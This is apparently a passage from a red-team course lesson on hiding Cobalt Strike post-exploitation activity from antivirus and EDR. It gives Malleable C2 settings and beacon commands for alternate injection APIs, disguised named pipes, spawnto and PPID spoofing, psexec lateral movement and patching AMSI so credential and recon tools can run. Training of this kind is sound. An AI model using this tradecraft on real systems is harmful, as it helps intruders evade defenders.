
Getting a Beacon running, either from an artifact on disk or in-memory, is only the first step.  There are many post-exploitation commands that we need to run for enumeration, credential access, lateral movement, etc, and these commands do not benefit from the same evasion capabilities that Beacon has enabled by default.

This lesson will run through common ways in which a post-ex command can be detected by anti-virus and how to mitigate them.  Most of them relate to fork and run commands, because they are by far the most risky from an OPSEC perspective.

The workflow for fork and run looks something like this:

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/738fdd2c41760d3713ca51c388d28048.png)

When Beacon receives a fork & run task, it will either spawn a new process or open a handle to an existing process, depending on whether the spawn or explicit variant is being used.  Beacon will inject the post-ex reflective DLL into the target process in the form of shellcode, and then starts a new thread to run it.  This is achieved using the typical VirtualAllocEx/WriteProcessMemory/CreateRemoteThread style of injection.

The first thing the post-ex capability does is start a new SMB named pipe.  It will then do its work and continuously write any output to that pipe.  Meanwhile, Beacon will make a connection to the pipe, read the output from it, and send it back to the team server for the operators to see.

When the post-ex capability has finished its work, it tears down the named pipe and calls either ExitProcess (if the spawn variant was used) or ExitThread (if the explicit variant was used).  Beacon will detect that the named pipe has been closed, gracefully stops reading from it, and reports the task as complete.

### CreateRemoteThread

This API has traditionally been the most widely used to kick off execution in a remote process and its use can be detected by security drivers running in the Kernel via the [PsSetCreateThreadNotifyRoutine](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine) function.  To push back on this, Beacon can be configured to use APIs other than CreateRemoteThread in the `process-inject.execute` block of Malleable C2.

appropriate one depending on the scenario.  The options are:

- CreateThread
    
- CreateRemoteThread
    
- SetThreadContext
    
- ObfSetThreadContext
    
- NtQueueApcThread
    
- NtQueueApcThread-s (this is the 'early bird' technique)
    
- RtlCreateUserThread

Some techniques are not appropriate for use when performing cross-architecture injection (i.e. 32-bit to 64-bit and vice versa), so ensure you have all your basis covered.  More information about each technique is provided in the [official documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_process-injection.htm).

```powershell
process-inject {
   execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
   }
}
```

### Named pipe names

The default named pipe name that Beacon uses with its post-ex DLLs is `postex_####` (where `#` is a random hex value). These pipe names are trivial to detect by drivers, such as Sysmon, and some 'known-bad' names are also included in SwiftOnSecurity's [sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml#L863) project.

The `post-ex.pipename` Malleable C2 option accepts a comma-separated list of alternate pipe names, where a random one is chosen each time.  For example:

```powershell
post-ex {
   set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
}
```

Because of the high volume of named pipes on Windows, it's likely an organisation will only log known-bad pipes from threat intel sources, etc, rather than every named pipe instance.  You're therefore probably safe picking anything that looks convincing enough to blend in with normal named pipe names.

### Parent-Child relationships

Relationships are hard.  In Windows, a process is typically spawned as a child of the process that started it.  In the case of our initial access, Beacon is running inside an MS Edge process.  It would look highly anomalous if it were then to spawn a process such as rundll32 (which is Beacon's default spawn-to).

![[Pasted image 20250728215512.png]]

Operators can change this spawn-to process at runtime, via the `spawnto` command.  This sets the spawn-to independently for that particular Beacon and should be used to contextualise its spawn-to prior to running any fork and run commands.  For example, MS Edge will spawn new Edge processes per open tab.  We can therefore set our spawn-to to MS Edge to blend in with that pattern.

```powershell
beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
beacon> powerpick Start-Sleep -s 60
```

![[Pasted image 20250728215506.png]]

You can also change the default spawn-to process from rundll32 via the `post-ex.spawnto` option in Malleable C2.  For example:

```powershell
post-ex {
   set spawnto_x86 "%windir%\\syswow64\\svchost.exe"; 
   set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
}
```


### psexec spawnto

Beacon's `jump psexec[64]` command uses the service binary artifact to run a Beacon payload, which is the one that spawns a new process to inject into (all the others inject into themselves).  This behaviour allows the service and service binary to be cleaned up immediately after execution.  The service binary cannot use a spawn-to value that contains environment variables like `%windir%`, so the artifact kit adds a dedicated command, called `ak-settings`, which allows you to control its spawn-to separately.

```powershell
beacon> help ak-settings
Usage: ak-settings [setting] [value]

Set settings to be used for generating artifacts through the artifact kit

Supported settings:
   service - Set the name to return for the PSEXEC_SERVICE hook.
   spawnto_[x86|x64] - Set the migration process to use for the service executable artifacts.

Usage Examples:
   ak-settings service updater
   ak-settings spawnto_x64 [c:\path\to\whatever.exe]

No arguments will display the current settings.
```

For example, to set the spawnto host to svchost, we would do:

```powershell
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\svchost.exe

beacon> ak-settings
[*] artifact kit settings:
[*]    service     = ''
[*]    spawnto_x86 = 'C:\Windows\SysWOW64\svchost.exe'
[*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'

beacon> jump psexec64 lon-ws-1 smb
```

![[Pasted image 20250728215806.png]]


### Image Load Events

A post-ex capability will typically have dependencies on other Windows modules (DLLs) for its functionality.  Many of these will be loaded into a process by default, such as kernel32.dll.  However, some will need to be loaded explicitly by the post-ex DLL's reflective loader.  Some notable examples include _System.Management.Automation.dll_, which is required by `powerpick` and `psinject`; and _cryptdll.dll_, _samlib.dll_, and _vaultcli.dll_ which are required by `mimikatz`.

Organisations can log instances of these DLLs being loaded by unexpected processes and flag them for further investigation.  When using fork and run commands, an operator should take care to inject these capabilities into a process that is known to load any modules that a post-ex DLL requires.  However, this can contradict with the parent-child strategy outlined above.  For example, there's probably no process that legitimately loads System.Management.Automation.dll that is also found as a legitimate child of MS Edge.  

For commands that have an explicit variant of fork and run, you're probably better off doing that to inject the post-ex capability into a target process that makes sense for the image loads.  However, some commands, like `execute-assembly`, don't have an explicit variant.

The parent process ID (PPID) spoofing technique is useful for these scenarios, as it allows Beacon to spawn processes under an arbitrary parent (as long as we have the privileges to obtain a handle to the desired parent process).  For example, we could use the `ps` command or process browser to find the PID of explorer.exe, set it as the `ppid`, set the `spawnto`, and then run the post-ex command.

```powershell
beacon> ppid 6648
beacon> spawnto x64 C:\Windows\System32\msiexec.exe
beacon> powerpick Start-Sleep -s 60
```

![[Pasted image 20250728220154.png]]

> To reset the PPID back to Beacon, run ppid without any arguments.

### AMSI

Both PowerShell and .NET are instrumented by AMSI which means any post-ex PowerShell script or .NET assembly may be detected by an anti-virus.  You'll likely see this with popular tools such as PowerView and Rubeus.

```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powershell Get-Domain
This script contains malicious content and has been blocked by your antivirus software.

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
[-] Failed to load the assembly w/hr 0x8007000b
```

There's a simple option that we can add to Cobalt Strike's Malleable C2 profile, called `amsi_disable`.

```powershell
post-ex {
   set amsi_disable "true";
}
```

This instructs the post-ex reflective loader used with the `powerpick`, `psinject`, and `execute-assembly` commands to patch the AMSI DLL in-memory before executing the script or assembly.


> [!NOTE] **IMPORTANT**
> `amsi_disable` **DOES NOT** apply to the `powershell` command - use `powerpick` or `psinject` instead.

### Post-ex DLL obfuscation